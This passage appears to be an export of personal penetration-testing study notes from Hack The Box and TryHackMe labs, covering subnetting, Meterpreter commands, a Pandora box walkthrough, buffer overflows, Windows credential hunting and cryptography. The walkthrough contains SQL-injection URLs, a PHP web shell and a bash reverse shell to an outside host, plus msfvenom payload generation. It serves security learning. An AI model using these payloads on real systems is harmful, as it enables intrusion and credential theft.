|\n| Bits | /8 | /16 | /24 | /32 |  |\n\nNext, we can divide the `64` IPv4 addresses that are available to us into `4 parts`:\n\n| **Hosts** | **Math** | **Subnets** | **Host range for each subnet** |\n| --- | --- | --- | --- |\n| 64 | / | 4 | \\= `16` |\n\nSo we know how big each subnet will be. From now on, we start from the network address given to us (192.168.12.128) and add the `16` hosts `4` times:\n\n| **Subnet No.** | **Network Address** | **First Host** | **Last Host** | **Broadcast Address** | **CIDR** |\n| --- | --- | --- | --- | --- | --- |\n| 1 | `192.168.12.128` | 192.168.12.129 | 192.168.12.142 | `192.168.12.143` | 192.168.12.128/28 |\n| 2 | `192.168.12.144` | 192.168.12.145 | 192.168.12.158 | `192.168.12.159` | 192.168.12.144/28 |\n| 3 | `192.168.12.160` | 192.168.12.161 | 192.168.12.174 | `192.168.12.175` | 192.168.12.160/28 |\n| 4 | `192.168.12.176` | 192.168.12.177 | 192.168.12.190 | `192.168.12.191` | 192.168.12.176/28 |\n\n## Mental Subnetting\nIt may seem like there is a lot of math involved in subnetting, but each octet repeats itself, and everything is a power of two, so there doesn't have to be a lot of memorization. The first thing to do is identify what octet changes.\n\n| **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** |\n| --- | --- | --- | --- |\n| /8 | /16 | /24 | /32 |\n\nIt is possible to identify what octet of the IP Address may change by remembering those four numbers. Given the Network Address: `192.168.1.1/25`, it is immediately apparent that 192.168.2.4 would not be in the same network because the `/25` subnet means only the fourth octet may change.\n\nThe next part identifies how big each subnet can be but by dividing eight by the network and looking at the `remainder`. This is also called `Modulo Operation (%)` and is heavily utilized in cryptology. Given our previous example of `/25`, `(25 % 8)` would be 1. This is because eight goes into 25 three times (8 \\* 3 = 24). There is a 1 leftover, which is the network bit reserved for the network mask. There is a total of eight bits in each octet of an IP Address. If one is used for the network mask, the equation becomes 2^(8-1) or 2^7, 128. The table below contains all the numbers.\n\n| **Remainder** | **Number** | **Exponential Form** | **Division Form** |\n| --- | --- | --- | --- |\n| 0 | 256 | 2^8 | 256 |\n| 1 | 128 | 2^7 | 256/2 |\n| 2 | 64 | 2^6 | 256/2/2 |\n| 3 | 32 | 2^5 | 256/2/2/2 |\n| 4 | 16 | 2^4 | 256/2/2/2/2 |\n| 5 | 8 | 2^3 | 256/2/2/2/2/2 |\n| 6 | 4 | 2^2 | 256/2/2/2/2/2/2 |\n| 7 | 2 | 2^1 | 256/2/2/2/2/2/2/2 |\n\nBy remembering the powers of two up to eight, it can become an instant calculation. However, if forgotten, it may be quicker to remember to divide 256 in half the number of times of the remainder.\n\nThe tricky part of this is getting the actual IP Address range because 0 is a number and not null in networking. So in our `/25` with 128 IP Addresses, the first range is `192.168.1.0-127`. The first address is the network, and the last is the broadcast address, which means the usable IP Space would become `192.168.1.1-126`. If our IP Address fell above 128, then the `usable ip space` would be 192.168.129-254 (128IPs the network and 255 is the broadcast).\n\n","lastmodified":"2023-09-12T17:33:55.021934615Z","tags":["cs/hacking","cs/hacking/htb"]},"/notes/hacking/htb-meterpreter-cheatsheet":{"title":"Meterpreter","content":"# Meterpreter\n| **Command**                                                     | **Description**                                                  |\n| :---------------------------------------------------------- | :----------------------------------------------------------- |\n| `help`                                                      | Open Meterpreter usage help.                                 |\n| `run \u003cscriptname\u003e`                                        | Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory. |\n| `sysinfo`                                                   | Show the system information on the compromised target.       |\n| `ls`                                                        | List the files and folders on the target.                    |\n| `use priv`                                                  | Load the privilege extension for extended Meterpreter libraries. |\n| `ps`                                                        | Show all running processes and which accounts are associated with each process. |\n| `migrate \u003cproc. id\u003e`                                      | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |\n| `use incognito`                                             | Load incognito functions.

SNMP (Simple Network Management Protocol) is a network monitoring protocol for seamless communication between multiple devices ona network, transmitting messages from the SNMP manager to the SNMP remote at each networking site (more [here](https://www.solarwinds.com/resources/it-glossary/snmp-walk)).\n\n```bash\nsnmpwalk -c public -v2c 10.10.11.136\n```\n\n- `-c`: set the community string (default is public).\n- `-v2c`: set version to 2c, which is the most common.\n\nIt takes ages so we use this instead:\n\n```bash\nsnmpbulkwalk -c public -v2c 10.10.11.136 . \u003e snmpwalk.1\n```\n\nWe can clean the file up:\n\n```bash\ngrep -oP '::.*?\\.\"' snmpwalk.1 | sort | uniq -c | sort -n\n```\n\nThen we can do:\n\n```bash\ngrep \u003csomething\u003e snmpwalk.1 | less -S\ngrep hrSWRun snmpwalk.1 | less -S\n```\n\nWe found this:\n\n```bash\nHOST-RESOURCES-MIB::hrSWRunParameters.823 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"\n\nHOST-RESOURCES-MIB::hrSWRunParameters.1117 = STRING: \"-u daniel -p HotelBabylon23\"\n```\n\nIt seems we a `daniel:HotelBabylon23` login:\n\n```bash\n~/htb/pandora \u003e grep hrSWRun snmpwalk.1 |grep 823                                                                                                                                                                                      1m 12s\nHOST-RESOURCES-MIB::hrSWRunIndex.823 = INTEGER: 823\nHOST-RESOURCES-MIB::hrSWRunName.823 = STRING: \"sh\"\nHOST-RESOURCES-MIB::hrSWRunID.823 = OID: SNMPv2-SMI::zeroDotZero\nHOST-RESOURCES-MIB::hrSWRunPath.823 = STRING: \"/bin/sh\"\nHOST-RESOURCES-MIB::hrSWRunParameters.823 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"\nHOST-RESOURCES-MIB::hrSWRunType.823 = INTEGER: application(4)\nHOST-RESOURCES-MIB::hrSWRunStatus.823 = INTEGER: runnable(2)\nHOST-RESOURCES-MIB::hrSWRunPerfCPU.823 = INTEGER: 0\nHOST-RESOURCES-MIB::hrSWRunPerfMem.823 = INTEGER: 604 KBytes\n\n~/htb/pandora \u003e grep hrSWRun snmpwalk.1 |grep 1117\nHOST-RESOURCES-MIB::hrSWRunIndex.1117 = INTEGER: 1117\nHOST-RESOURCES-MIB::hrSWRunName.1117 = STRING: \"host_check\"\nHOST-RESOURCES-MIB::hrSWRunID.1117 = OID: SNMPv2-SMI::zeroDotZero\nHOST-RESOURCES-MIB::hrSWRunPath.1117 = STRING: \"/usr/bin/host_check\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1117 = STRING: \"-u daniel -p HotelBabylon23\"\nHOST-RESOURCES-MIB::hrSWRunType.1117 = INTEGER: application(4)\nHOST-RESOURCES-MIB::hrSWRunStatus.1117 = INTEGER: runnable(2)\nHOST-RESOURCES-MIB::hrSWRunPerfCPU.1117 = INTEGER: 0\nHOST-RESOURCES-MIB::hrSWRunPerfMem.1117 = INTEGER: 1360 KBytes\n```\n\nWe ssh:\n\n```bash\n~/htb/pandora \u003e ssh daniel@10.10.11.136                                \nThe authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.\nECDSA key fingerprint is SHA256:9urFJN3aRYRRc9S5Zc+py/w4W6hmZ+WLg6CyrY+5MDI.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.136' (ECDSA) to the list of known hosts.\ndaniel@10.10.11.136's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 18 Jul 11:12:54 UTC 2022\n\n  System load:           0.09\n  Usage of /:            63.4% of 4.87GB\n  Memory usage:          8%\n  Swap usage:            0%\n  Processes:             231\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.136\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:f793\n\n  =\u003e /boot is using 91.8% of 219MB\n\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\ndaniel@pandora:~$\n```\n\nWe can look into the webserver, `/var/www`.\n\n```bash\ndaniel@pandora:/var/www/pandora/pandora_console$ find . | grep config.php\n```\n\nWe get permission denied when trying to access `config.php`, only matt seems to have access:\n\n```bash\ndaniel@pandora:/var/www/pandora/pandora_console/include$ ls -la config.php \n-rw------- 1 matt matt 413 Dec  3  2021 config.php\n```\n\nWe can check if matt is running anything with `ps -ef` but he is not.

We can look at the output using `less` by running:\n\n```bash\nless ~/.local/share/sqlmap/output/localhost/dump/pandora/tusuario.csv -S\n```\n\n- `-S`: line breaks.\n\nNow we have:\n\n```bash\nmatt@pandora.htb f655f807365b6dc602b31ab3d6d43acc\ndaniel@pandora.htb 76323c174bd49ffbbdedf678f6cc89a6\n```\n\nWe can do:\n\n```bash\nsqlmap -r pandora.req --batch -D pandora -T tsessions_php --dump\n```\n\nTo find out the sessions! We will take one:\n\n```bash\n| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:\"matt\";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |\n```\n\nAnd put it in the URL, like so `http://localhost:8000/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq` and refresh `http://localhost:8000/pandora_console/`. We get it!\n\n![Screenshot from 2022-07-18 13-13-50](notes/images/Screenshot%20from%202022-07-18%2013-13-50.png)\n\nMatt doesn't seem to be an admin. Let's try some other things.\n\nWe can do:\n\n```bash\nhttp://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' union select 1-- -\n```\n\nBecause we have 3 `tsessions_php` entries, we enter:\n\n```bash\nhttp://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' union select 1,2,3-- -\n```\n\nWhich gets rid of the error message. Now we can do:\n\n```bash\nhttp://localhost:8000/pandora_console/include/chart_generator.php?session_id=1%27%20union%20select%201,2,%27id_usuario|s:5:%22admin%22;%27--%20-\n```\n\nAnd we are in! We can see that the in `Admin tools -\u003e File manager` we get put in `/images/`, so lets try to upload something there. The URL is `http://localhost:8000/pandora_console/images/`. Our shell:\n\n```php\n\u003c?php                                                                             \nsystem($_REQUEST['cmd']);                                                                                                                                                                                                                   \n?\u003e\n```\n\nWe can upload it, then execute it. It doesn't display anything but we can run `http://localhost:8000/pandora_console/images/shell.php?cmd=whoami` and we get `matt`!\n\nWe can open it in **Burp**, send it to the `Repeater` and convert the request type to **POST**. Then we change `cmd` to:\n\n```bash\ncmd=bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.12/9001 0\u003e\u00261'\n```\n\nMake sure to `ctrl+u` it to encode it to URL. We are in!\n\n```bash\n~/htb/pandora \u003e nc -nlvp 9001\nListening on 0.0.0.0 9001\nConnection received on 10.10.11.136 59342\nbash: cannot set terminal process group (871): Inappropriate ioctl for device\nbash: no job control in this shell\nmatt@pandora:/var/www/pandora/pandora_console/images$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\u003cges$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  \n```\n\nThen we `ctrl+z` it and run:\n\n```bash\nstty raw -echo; fg\n\nENTER\nENTER\n```\n\nNow we have proper shell.\n\nWe can run **LinPEAS**. We download it, then run a `python http` server and curl from it:\n\n```bash\ncurl http://10.10.14.12:8001/linpeas.sh | bash\n```\n\nThere's this:\n\n```bash\n╔══════════╣ Executing Linux Exploit Suggester\n╚ https://github.com/mzet-/linux-exploit-suggester\n[+] [CVE-2021-4034] PwnKit\n\n   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\n   Exposure: probable\n   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro\n   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main\n```\n\nFrom their website: We discovered a Local Privilege Escalation (from any user to root) in\npolkit's pkexec, a SUID-root program that is installed by default on\nevery major Linux distribution:\n\n\"Polkit (formerly PolicyKit) is a component for controlling system-wide\nprivileges in Unix-like operating systems.

Before the program code and data enter the processor for processing the RAM serves as data storage.\n\nWhen the primary memory loses power, all stored contents are lost.\n\n### Secondary\nThis is the external data storage,  such as **HDD/SSD**, **Flash Drives** and **CD/DVD-ROMs** of a computer, which is **not** directly accessed by the CPU, but via the **I/O** interfaces.\n\n## Control Unit\nIt is responsible for the correct interworking of the processor's individual parts. The tasks can be summarised as:\n\n- Reading data from the RAM\n- Saving data in RAM\n- Provide, decode and execute an instruction\n- Processing the inputs from peripheral devices\n- Processing of outputs to peripheral devices\n- Interrupt control\n- Monitoring of the entire system\n\nThe **CU** contains the **Instruction Register** (IR), which contains all instructions that the processor decodes and executes. The instruction decoder translates the instruction and passes them to the execution unit, which then executes the instruction. The execution unit transfers the data to the **ALU** for calculation and receives the result back from there.\n\nData used during execution temporarily is stored in **registers**.\n\n## Central Processing Unit\nIt provides the actual processing power. It fetches commands from memory one after the other and initiates data processing.\n\nThe processor is also often referred to as **microprocessor** when placed in a single electronic circuit, as in our PCs.\n\nThe best-known **CPU architectures** are:\n- x86/i386 - (AMD and Intel)\n- x86-64/amd64 - (Microsoft and Sun)\n- ARM - (Acorn)\n\nEach of them is built in a specific way, called **Instruction Set Architecture** (ISA). It describes the behaviour of a CPU concerning the instruction set used. Above all, ISA gives us the possibility to understand the unified behaviour of **machine code** in **assembly language** concerning **registers**, **data types** etc.\n\nThere are four different types of ISA:\n- CISC - Complex Instruction Set Computing\n- RISC - Reduced Instruction Set Computing\n- VLIW - Very Long Instruction Word\n- EPIC - Explicitly Parallel Instruction Computing\n\n## Instruction Cycle\n| Instruction                | Description                                                                                                                                    |\n| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |\n| Fetch                      | Read from the **Instruction Address Register** (IAR) then load from the **cache** or **RAM** into the **Instruction Register** (IR).           |\n| Decode                     | Converts instruction and starts to execute.                                                                                                    |\n| Fetch Operands             | If further data needs to be loaded, load from **cache** or **RAM**.                                                                            |\n| Execute                    | The instruction is executed.

Burp offers multiple capabilities such as web crawler, scanner, proxy, repeater, intruder and many more.  \n\nA web crawler (also known as a web spider or web robot) is a program or automated script which browses the World Wide Web in a methodical, automated manner. This process  \nis called Web crawling or spidering. Many legitimate sites, in particular search engines, use spidering as a means of providing up-to-date data.  \n\nIf you tunnel web traffic through Burp Suite (without intercepting the packets), by default it can passively spider the website, update the site map with all of the contents requested and thus creating a tree of files and directories without sending any further requests.\n\n### Stable Reverse Shell\n```bash\nsudo python3 -m http.server 80\n```\n\n```bash\nsudo nc -lvnp 443\n```\n\n- Functional php reverse shell:\n```bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n```\n\n### SUID\nCommonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here.\n\n### Useful Commands\n```bash\ncat * | grep -i passw*\n```\n\n### Crack a ZIP file\nTurn into hash:\n```bash\nzip2john backup.zip \u003e hashes\n```\n\n```bash\njohn -wordlist=/usr/share/wordlists/rockyou.txt hashes\n```\n\n### SQLmap\nSQLmap is an open-source tool used in penetration testing to detect and exploit SQL injection flaws. SQLmap automates the process of detecting and exploiting SQL injection.

Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.\n\nThis task will present some known places to look for passwords on a Windows system.\n\nBefore going into the task, remember to click the **Start Machine** button. You will be using the same machine throughout tasks 3 to 5. If you are using the **AttackBox**, this is also a good moment to start it as you'll be needing it for the following tasks.\n\nIn case you prefer connecting to the target machine via RDP, you can use the following credentials:\n\n**User:** `thm-unpriv`\n\n**Password:** `Password321`\n\n## Unattended Windows Installations\nWhen installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:\n\n-   C:\\Unattend.xml\n-   C:\\Windows\\Panther\\Unattend.xml\n-   C:\\Windows\\Panther\\Unattend\\Unattend.xml\n-   C:\\Windows\\system32\\sysprep.inf\n-   C:\\Windows\\system32\\sysprep\\sysprep.xml\n\nAs part of these files, you might encounter credentials:\n\n```shell-session\n\u003cCredentials\u003e\n    \u003cUsername\u003eAdministrator\u003c/Username\u003e\n    \u003cDomain\u003ethm.local\u003c/Domain\u003e\n    \u003cPassword\u003eMyPassword123\u003c/Password\u003e\n\u003c/Credentials\u003e\n```\n\n## Powershell History\nWhenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:\n\n```shell-session\ntype %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n```\n\n**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`. \n\n## Saved Windows Credentials\nWindows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:\n\n```shell-session\ncmdkey /list\n```\n\nWhile you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.\n\n```shell-session\nrunas /savecred /user:admin cmd.exe\n```\n\n## IIS Configuration\nInternet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:\n\n-   C:\\inetpub\\wwwroot\\web.config\n-   C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\n\nHere is a quick way to find database connection strings on the file:\n\n```shell-session\ntype C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString\n```\n\n## Retrieve Credentials from Software: PuTTY\nPuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.\n\nTo retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:\n\n```shell-session\nreg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s\n```\n\n**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.\n\nJust as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.","lastmodified":"2023-09-12T17:33:55.021934615Z","tags":["cs/hacking"]},"/notes/hacking/rdp":{"title":"RDP","content":"Stands for Remote Desktop Protocol.\n\n## Mounting using rdesktop\n```bash\nrdesktop 10.10.10.132 -d HTB -u administrator -p 'Password' -r disk:linux='home/user/rdesktop/files'\n```\n\n```bash\nxfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password' /drive:linux,home/plaintext/htb/academy/filetransfer'\n```\n\nWe can then go to `\\\\tsclient\\` directory to transfer files to and from the RDP session.","lastmodified":"2023-09-12T17:33:55.021934615Z","tags":["cs/hacking","cs/hacking/htb"]},"/notes/hacking/so-prevention-techniques":{"title":"Stack-overflow Prevention Techniques and Mechanisms","content":"# Stack-overflow Prevention Techniques and Mechanisms\n---\nSecurity mechanisms:\n\n- Canaries\n- Address Space Layout Randomisation ([](notes/hacking/cpu-architecture.md#ASLR))\n- Data Execution Prevention (DEP)\n\n## Canaries\nThey are known values written to the stack between buffer and control data to detect buffer overflows.\n\nIn case of a buffer overflow, the canary would be overwritten first and the operating system checks during runtime if the canary is present and unaltered.\n\n## Address Space Layout Randomisation (ASLR)\nIt makes it difficult to find target addresses in memory.

So it should point to some **shellcode** for example.\n\nWe first check for overflow:\n\n```bash\nstudent@nix-bow:~$ gdb -q bow32\n\n(gdb) run $(python -c \"print '\\x55' * 1200\")\nStarting program: /home/student/bow/bow32 $(python -c \"print '\\x55' * 1200\")\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x55555555 in ??

As far as we know, the `EIP` points to the next instruction to be executed.\n\n```\n(gdb) info registers \n\neax            0x11\necx            0xffffd6c0-10560\nedx            0xffffd06f-12177\nebx            0x555555551431655765\nesp            0xffffcfd00xffffcfd0\nebp            0x555555550x55555555# \u003c---- EBP overwritten\nesi            0xf7fb5000-134524928\nedi            0x00\neip            0x555555550x55555555# \u003c---- EIP overwritten\neflags         0x10286[ PF SF IF RF ]\ncs             0x2335\nss             0x2b43\nds             0x2b43\nes             0x2b43\nfs             0x00\ngs             0x6399\n```\n\nIf we want to imagine the process visually, then the process looks something like this:\n\n![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_2.png)\n\nThis means that we have to write access to the EIP. This, in turn, allows specifying to which memory address the EIP should jump. However, to manipulate the register, we need an exact number of U's up to the EIP so that the following 4 bytes can be overwritten with our desired memory address.\n\n## Determine the Offset\nHow many bytes are needed to overwrite the buffer and how much space we have around our shellcode.\n\n- Create pattern:\n\n```bash\nPietra@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 \u003e pattern.txt\nPietra@htb[/htb]$ cat pattern.txt\n\nAa0Aa1Aa2Aa3Aa4Aa5...\u003cSNIP\u003e...Bn6Bn7Bn8Bn9\n```\n\nNow we replace our 1200 \"`U`\"s with the generated patterns and focus our attention again on the EIP.\n\n- Using generated pattern:\n\n```\n(gdb) run $(python -c \"print 'Aa0Aa1Aa2Aa3Aa4Aa5...\u003cSNIP\u003e...Bn6Bn7Bn8Bn9'\") \n\nThe program being debugged has been started already.\nStart it from the beginning?

()\n```\n\n```\n(gdb) info registers eip\n\neip            0x694235690x69423569\n```\n\nWe see that the `EIP` displays a different memory address, and we can use another MSF tool called \"`pattern_offset`\" to calculate the exact number of characters (offset) needed to advance to the `EIP`.\n\n- Offset:\n\n```\nPietra@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569\n\n[*] Exact match at offset 1036\n```\n\n\n![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png)\n\nIf we now use precisely this number of bytes for our \"`U`\"s, we should land exactly on the `EIP`. To overwrite it and check if we have reached it as planned, we can add 4 more bytes with \"`\\x66`\" and execute it to ensure we control the `EIP`.\n\n```\n(gdb) run $(python -c \"print '\\x55' * 1036 + '\\x66' * 4\")\n\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/student/bow/bow32 $(python -c \"print '\\x55' * 1036 + '\\x66' * 4\")\nProgram received signal SIGSEGV, Segmentation fault.\n0x66666666 in ?? ()\n```\n\n![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png)\n\nNow we see that we have overwritten the `EIP` with our \"`\\x66`\" characters. Next, we have to find out how much space we have for our shellcode, which then executes the commands we intend. As we control the `EIP` now, we will later overwrite it with the address pointing to our shellcode's beginning.\n\n## Determine Length for Shellcode\n```bash\nPietra@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c\n\nNo encoder or badchars specified, outputting raw payload\nPayload size: 68 bytes\n\u003cSNIP\u003e\n```\n\nWe now know that our payload will be about 68 bytes. However we should try to take a larger range in case the shellcode increases.\n\nWe can insert some **no operation instruction** (**NOPS**) before our shellcode begins so it can be executed cleanly.

Modern ciphers are cryptographic, but there are many non cryptographic ciphers like Caesar.\n\n**Plaintext** - Data before encryption, often text but not always. Could be a photograph or other file\n\n**Encryption** - Transforming data into ciphertext, using a cipher.\n\n**Encoding** - NOT a form of encryption, just a form of data representation like base64. Immediately reversible.\n\n**Key** - Some information that is needed to correctly decrypt the ciphertext and obtain the plaintext.\n\n**Passphrase** \\- Separate to the key, a passphrase is similar to a password and used to protect a key.\n\n**Asymmetric encryption** - Uses different keys to encrypt and decrypt.\n\n**Symmetric encryption** - Uses the same key to encrypt and decrypt\n\n**Brute force** - Attacking cryptography by trying every different password or every different key\n\n**Cryptanalysis** - Attacking cryptography by finding a weakness in the underlying maths\n\n**Alice and Bob** - Used to represent 2 people who generally want to communicate. They’re named Alice and Bob because this gives them the initials A and B. \n\n## Why is encryption important?\nCryptography is used to protect confidentiality, ensure integrity, ensure authenticity. You use cryptography every day most likely, and you’re almost certainly reading this now over an encrypted connection.\n\nWhen logging into TryHackMe, your credentials were sent to the server. These were encrypted, otherwise someone would be able to capture them by snooping on your connection.\n\nWhen you connect to SSH, your client and the server establish an encrypted tunnel so that no one can snoop on your session.\n\nWhen you connect to your bank, there’s a certificate that uses cryptography to prove that it is actually your bank rather than a hacker.\n\nWhen you download a file, how do you check if it downloaded right? You can use cryptography here to verify a checksum of the data.\n\nYou rarely have to interact directly with cryptography, but it silently protects almost everything you do digitally.\n\nWhenever sensitive user data needs to be stored, it should be encrypted. Standards like [PCI-DSS](https://www.pcisecuritystandards.org/documents/PCI_DSS_for_Large_Organizations_v1.pdf) state that the data should be encrypted both at rest (in storage) AND while being transmitted. If you’re handling payment card details, you need to comply with these PCI regulations. Medical data has similar standards. With legislation like GDPR and California’s data protection, data breaches are extremely costly and dangerous to you as either a consumer or a business.\n\n**DO NOT** encrypt passwords unless you’re doing something like a password manager. Passwords should not be stored in plain text, and you should use hashing to manage them safely.\n\n## RSA\n### The math(s) side\nRSA is based on the mathematically difficult problem of working out the factors of a large number. It’s very quick to multiply two prime numbers together, say 17\\*23 = 391, but it’s quite difficult to work out what two prime numbers multiply together to make 14351 (113x127 for reference).\n\n### The attacking side\nThe maths behind RSA seems to come up relatively often in CTFs, normally requiring you to calculate variables or break some encryption based on them. The wikipedia page for RSA seems complicated at first, but will give you almost all of the information you need in order to complete challenges.\n\nThere are some excellent tools for defeating RSA challenges in CTFs, and my personal favorite is [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) which has worked very well for me. I’ve also had some success with [https://github.com/ius/rsatool](https://github.com/ius/rsatool).\n\nThe key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.\n\n“p” and “q” are large prime numbers, “n” is the product of p and q.\n\nThe public key is n and e, the private key is n and d.\n\n“m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).\n\n### CTFs involving RSA\nCrypto CTF challenges often present you with a set of these values, and you need to break the encryption and decrypt a message to retrieve the flag.\n\nThere’s a lot more maths to RSA, and it gets quite complicated fairly quickly. If you want to learn the maths behind it, I recommend reading MuirlandOracle’s blog post here: [https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/).\n\n## Establishing Keys Using Asymmetric Cryptography\n### Metaphor time\nImagine you have a secret code, and instructions for how to use the secret code. If you want to send your friend the instructions without anyone else being able to read it, what you could do is ask your friend for a lock.\n\nOnly they have the key for this lock, and we’ll assume you have an indestructible box that you can lock with it.\n\nIf you send the instructions in a locked box to your friend, they can unlock it once it reaches them and read the instructions.\n\nAfter that, you can communicate in the secret code without risk of people snooping.\n\nIn this metaphor, the secret code represents a symmetric encryption key, the lock represents the server’s public key, and the key represents the server’s private key.\n\nYou’ve only used asymmetric cryptography once, so it’s fast, and you can now communicate privately with symmetric encryption.\n\n### The Real World\nIn reality, you need a little more cryptography to verify the person you’re talking to is who they say they are, which is done using digital signatures and certificates. You can find a lot more detail on how HTTPS (one example where you need to exchange keys) really works from this excellent blog post. [https://robertheaton.com/2014/03/27/how-does-https-actually-work/](https://robertheaton.com/2014/03/27/how-does-https-actually-work/)\n## Digital Signatures and Certificates\n### What's a Digital Signature?\nDigital signatures are a way to prove the authenticity of files, to prove who created or modified them. Using asymmetric cryptography, you produce a signature with your private key and it can be verified using your public key. As only you should have access to your private key, this proves you signed the file. Digital signatures and physical signatures have the same value in the UK, legally.\n\nThe simplest form of digital signature would be encrypting the document with your private key, and then if someone wanted to verify this signature they would decrypt it with your public key and check if the files match.\n\n### Certificates - Prove who you are!\nCertificates are also a key use of public key cryptography, linked to digital signatures. A common place where they’re used is for HTTPS. How does your web browser know that the server you’re talking to is the real tryhackme.com?\n\nThe answer is certificates. The web server has a certificate that says it is the real tryhackme.com. The certificates have a chain of trust, starting with a root CA (certificate authority). Root CAs are automatically trusted by your device, OS, or browser from install. Certs below that are trusted because the Root CAs say they trust that organisation. Certificates below that are trusted because the organisation is trusted by the Root CA and so on. There are long chains of trust. Again, this blog post explains this much better than I can. [https://robertheaton.com/2014/03/27/how-does-https-actually-work/](https://robertheaton.com/2014/03/27/how-does-https-actually-work/)\n\nYou can get your own HTTPS certificates for domains you own using Let’s Encrypt for free. If you run a website, it’s worth setting it up.\n\n## Cracking SSH ID_RSA\nhttps://vk9-sec.com/ssh2john-how-to/\n\n## PGP, GPG and AES\n### What is PGP?\nPGP stands for Pretty Good Privacy. It’s a software that implements encryption for encrypting files, performing digital signing and more.\n\n### What is GPG?\n[GnuPG or GPG](https://gnupg.org/) is an Open Source implementation of PGP from the GNU project. You may need to use GPG to decrypt files in CTFs. With PGP/GPG, private keys can be protected with passphrases in a similar way to SSH private keys. If the key is passphrase protected, you can attempt to crack this passphrase using John The Ripper and gpg2john. The key provided in this task is not protected with a passphrase.\n\nThe man page for GPG can be found online [here](https://www.gnupg.org/gph/de/manual/r1023.html).\n\n### What about AES?\nAES, sometimes called Rijndael after its creators, stands for Advanced Encryption Standard. It was a replacement for DES which had short keys and other cryptographic flaws.\n\nAES and DES both operate on blocks of data (a block is a fixed size series of bits).\n\nAES is complicated to explain, and doesn’t seem to come up as often. If you’d like to learn how it works, here’s an excellent 